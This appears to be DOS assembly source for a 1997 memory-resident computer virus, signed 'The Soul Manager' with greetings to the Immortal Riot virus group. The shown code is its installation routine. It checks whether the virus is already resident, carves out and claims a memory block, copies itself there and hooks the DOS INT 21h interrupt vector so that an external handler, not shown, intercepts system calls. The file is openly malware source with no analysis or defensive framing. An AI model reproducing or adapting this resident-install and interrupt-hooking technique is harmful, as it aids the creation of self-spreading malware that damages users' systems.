include .\sylvia_p\star.inc
include .\sylvia_p\short.inc
include .\sylvia_p\strucs.inc

include vdata.ash
include startup.ash

extrn 	Int_21h_Handler:NEAR
extrn	Enable_INT_21h:NEAR
extrn	Init_Rand:NEAR

;----------------------------------------------------------------------------
			.model tiny
			.286
			.stack stack_size

			jumps
			locals @@

;============================================================================
			.code
;----------------------------------------------------------------------------
			PUBLIC	C main
main			PROC	C NEAR

			db	400 dup(90h)
			
			PLABEL	Start_Crypt
			call	Install_Virus
			ret

main			ENDP

;----------------------------------------------------------------------------

db 'Dis quick test virus was written by The Soul Manager on 5/9/97',0Dh,0Ah
db '(Yes, yes, I *ADMIT* I should find something to do with a Friday night).',0Dh,0Ah
db 'Greetz to Immortal Riot (from Australia).'

;----------------------------------------------------------------------------
Install_Virus		PROC	NEAR

			call	Init_Rand
			mov	ax,2029h
			mov	di,ofs Marker
			int	21h
			cmp	ax,0101h
			DOIF	NE
			  call	Enable_INT_21h
			  mov	ah,4Ah
			  mov	bh,-1
			  mov	es,wo ds:[_psp]
			  int	21h
			  mov	ah,4Ah
			  mov	cx,(mem_size)/10h
			  ;stc			; already set
			  sbb	bx,cx
			  int	21h
			  mov	ah,48h
			  mov	bx,cx
			  int	21h
			  jc	$	; umm.. JC has money?.. lucky JC.
			  push	ax
			  dec	ax
			  mov	es,ax
			  mov	si,08h
			  mov	es:[(si-8).mcb_OwnerPSP_Seg],si
			  pop	es			  
			  mov	di,si
			  mov	cx,(code_size-7)/2
			  cld
			  rep	movsw
			  mvs	ds,es
			  mov	ax,3521h
			  int	21h
			  mov	wo ds:Int_21h_Vector.wLO,bx
			  mov	wo ds:Int_21h_Vector.wHI,es
			  mov	ah,25h
			  mov	dx,ofs Int_21h_Handler
			  int	21h
			  mvs	es,cs
			  mvs	ds,cs
			  call	Install_Virus	; Recursive Check ;)
			DONE
			ret

Install_Virus		ENDP

;============================================================================
			END